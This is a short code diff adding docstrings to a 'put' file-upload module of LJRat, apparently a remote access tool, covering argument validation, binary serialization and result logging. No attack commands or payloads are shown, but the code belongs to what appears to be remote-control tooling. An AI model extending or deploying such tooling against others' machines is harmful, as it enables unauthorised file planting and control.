@@ -1,3 +1,7 @@
+"""
+Module that adds the put functionality to LJRat
+"""
+
 import struct
 import message
 import os
@@ -25,12 +29,14 @@ def entrypoint(self, args):
 
 
 def validator(args):
+    '''Function to check if the file exists locally'''
     args = args.split()
     if not os.path.exists(args[0]):
         return (None, E_FILE_EXISTS_ERROR)
     return args
 
 def _serialize(data):
+    '''Function to take all the required arguments and pack a data structure with binary data'''
     serialized_data = bytearray()
     file_bytes = None
 
@@ -60,6 +66,7 @@ def _serialize(data):
 
 
 def _deserialize(msg):
+    '''Function that calls the formatter and outputs the data to a log'''
     log_dir = ctx.log_dir
 
     if msg.result_code == E_SUCCESS:
